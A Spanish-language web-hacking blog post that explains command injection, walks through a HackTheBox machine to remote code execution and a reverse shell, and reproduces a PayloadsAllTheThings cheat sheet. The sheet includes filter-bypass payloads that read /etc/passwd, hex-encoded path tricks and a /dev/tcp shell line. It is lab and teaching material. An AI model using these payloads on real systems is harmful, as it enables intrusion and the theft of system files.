---
title: Command Injection
author:
date: 07-04-2023
categories: [Hacking Web]
tags: [Injection]
pin: false
image:
  path: /assets/img/commons/Command/Command.jpg
  alt: Command Injection
---

## Introduction 
Quien no ha escuchado el termino inyección en Hacking? es uno de los terminos más comúnes y a la mayoría de personas se les viene a la mente las famosas SQLInjection pero hay muchos y diferentes tipos de inyecciones, una de las más comunes es la inyección de comandos mejor conocida como **"Command Injection"** ¿Qué es esto realmente? Pues en este otro post sobre Hacking Web enseñaré a como explotar este tipo de vulnerabilidad y como se puede identificar 

## What is command injection?

Este tipo de palabra se deriva y se crea por los comandos de nuestro SO, de ahí proviene nuestra otra palabra que es inyección de shell, es una vulnerabilidad documentada por OWASP donde permite ejecutar arbitrariamente comandos del sistema operativo en el servidor que ejecuta la aplicación vulnerable
este tipo de vulnerabilidad ocurre cuando no se sanitiza bien el input del usuario y no se usan los parámetros adecuados para llamar a las funciones de nuestra shell como puede ser **exec()** o **system()** para que dichos comandos que se ingresen sean interpretados por el sistema,esto permitiría que un atacante pueda ejecutar comandos maliciosos en el sistema y a su vez obtener acceso no autorizado a recursos, datos o sistemas. 
Puede ocurrir en varios escenarios, como en aplicaciones web que permiten la entrada de comandos en formularios, aplicaciones que aceptan entrada de usuario para ejecutar comandos en el sistema operativo, o incluso en dispositivos IoT que permiten la entrada de comandos a través de interfaces de red.
La inyección de comandos es una vulnerabilidad que puede ser evitada mediante la validación y sanitización adecuada de la entrada del usuario, utilizando técnicas como la validación de formato, la validación de rango y la restricción de caracteres especiales en la entrada.

## Command Injection Example

Para este ejemplo rápido me basaré a través de la documentación de [OWASP](https://owasp.org/www-community/attacks/Command_Injection) Obeservamos el siguiente código C que imprime el contenido de un archivo en la terminal.

```c
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv) {
 char cat[] = "cat ";
 char *command;
 size_t commandLength;

 commandLength = strlen(cat) + strlen(argv[1]) + 1;
 command = (char *) malloc(commandLength);
 strncpy(command, cat, commandLength);
 strncat(command, argv[1], (commandLength - strlen(cat)) );

 system(command);
 return (0);
}
``` 
Ejecuté esta prueba de código con el output de un escaneo de puertos hacía una máquina de HackTheBox

![](/assets/img/commons/Command/terminal.png)

Observamos que me devuelve el output como si hubiera hecho un simple cat al archivo pero el problema con esto es que no valida el parámetro de entrada. argv. se pasará un argumento en la línea de comandos (argv[1]), pero no se verifica si realmente se proporciona un argumento y si ese argumento es válido.
Ahora que pasaría si seguido de mi documento que quiero que me imprima le indico cualquier comando a ejecutar a nivel de sistema, ejemplo pondré ifconfig para ver mis interfaces de red del sistema

![](/assets/img/commons/Command/terminal1.png)
  
La salida mostrará el contenido del archivo llamado targeted (de nuestro escaneo con nmap), pero seguirá interpretando el resto del parámetro de entrada. El ; se utiliza como separador de comandos y el texto que sigue se evalúa como un nuevo comando. En este caso, se ejecutará el comando ifconfig  y el programa imprimirá al último mis interfaces de red como le indiqué

Aquí esta otro ejemplo haciendo un ls -la para obervar todos mis directorios de la ruta actual de trabajo (ls muestra contenido de directorio -l (long) me muestra mas detalladamente la lista de los archivos (-a all) todo incluyendo directorios ocultos) 

![](/assets/img/commons/Command/terminal2.png)

y vemos que nuestro input lo sigue interpretando y lo podemos seguir obervando debajo. Aprovechandose de esto podŕiamos actuar como un atacante y enviarnos una reverse shell a nuestro sistema de manera simple

<mark style="background: #FFF3A3A6;">Lado Izquierdo máquina victima</mark>  <---------------------------> <mark style="background: #FF5582A6;">Lado Derecho máquina atacante</mark>
 
![](/assets/img/commons/Command/terminal3.png)

Esta claro que en un entorno real no lo tendrías de forma sencilla para eso tendrás que analizar algún leak de información acerca del código fuente sobre los campos que puedas ingresar valores, normalmente como anteriormente lo mencioné se dan en formularios y  aplicaciones que aceptan entradas de comandos en el sistema operativo, si es que no tienen bien sanitizadas dichas funciones.  

## Machine exploitation / Command Injection

Para este otro ejemplo agarré una máquina de HackTheBox que tiene esta vulnerabilidad expuesta, una vez enumerando y recopilando información sobre nuestro activo. vemos un sitio web que nos permite elegir imagenes en diferentes formatos

![](/assets/img/commons/Command/web.png)

seguido interceptaré la petición con burpsuite **nuestra querida herramienta de confianza:)** y observaré que parámetros esta estableciendo con la data que se envía 

![](/assets/img/commons/Command/web1.png)

En la parte inferior de la solicitud podemos ver los datos que se envían;  en este caso hay tres parámetros, el nombre de la foto que esta establecida, tipo de archivo y dimensiones. En ocasiones no sabremos las funciones y llamadas a nivel de sistema que se ejecuta en el backend pero veces requieren una combinación de fuerza bruta y adivinanzas insinunado la entrada de valores, en este caso parece muy probable que el servidor no mantenga diferentes tamaños y formatos de cada imagen en el servidor, sino que convierta una imagen usando una herramienta como convert(de ImageMagick )
Por ejemplo, para cambiar el tamaño de una imagen JPG a 1000 por 1000 y convertirla a PNG, el servidor podría ejecutar:

`convert original.jpg -resize 1000x1000 new.png`

Si eso es lo que está haciendo el servidor, lo siguiente es la entrada del usuario (que se muestra en []):

`convert [photo] -resize [dimensions] new.[filetype]`

podríamos enviarnos una traza a nuestro equipo para ver si seguido del parámetro se puede acontecer esta inyección de comando

![](/assets/img/commons/Command/web2.png)

me pondré en escucha por la interfaz tun0 a escucha de trazas icmp

![](/assets/img/commons/Command/terminal4.png)
 
ahora enviando el ping que establecimos en Burpsuite nos llega a nuestra máquina por lo tanto tenemos RCE 

![](/assets/img/commons/Command/terminal5.png)

una vez que tengamos ejecución remota de comandos nos queda solo acceder al sistema mediante una reverse shell un poco diferente ya que aveces el input que llegamos a ingresar no lo interpreta de una manera correcta

![](/assets/img/commons/Command/terminal6.png)

haré la petición con curl a mi servidor compartido con python3 donde alojaré el script de la reverse shell como index.html  y con un pipe con bash ejecutar el script

![](/assets/img/commons/Command/terminal7.png)

me pondré a la escucha con netcat por el puerto indicado y el servidor a la espera del archivo indicado 

![](/assets/img/commons/Command/terminal8.png)

Una vez enviada la petición recibimos un GET a nuestro server del index.html y de lado derecho nuestra reverse shell con éxito y por lo tanto estamos dentro del sistema

![](/assets/img/commons/Command/terminal9.png)

![](/assets/img/commons/Command/terminal10.png) 

## Other Commands Injection/Execution
Dependiendo de  dónde se inyecte la entrada,  es posible que deba  terminar el contexto citado  (usando "o ') antes de los comandos
Recomiendo mucho el uso de  [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection) y [PayloadAllTheTHings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) podemos encontrar diversas maneras de aplicar estas inyecciones, incluso bypesseando algunos filtros de seguridad si en la parte del backend emplea algúna sentencia que nos bloquee la ejecución de nuestros comandos 

```console
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
``` 

```console
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls
```
## Filter Bypass without space

```console
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242
```
## Bypass with backslash newline

```console 
❯ cat /et\
c/pa\
sswd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[SNIP]
```

## Bypass characters filter via hex encoding (Linux)

```console
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```
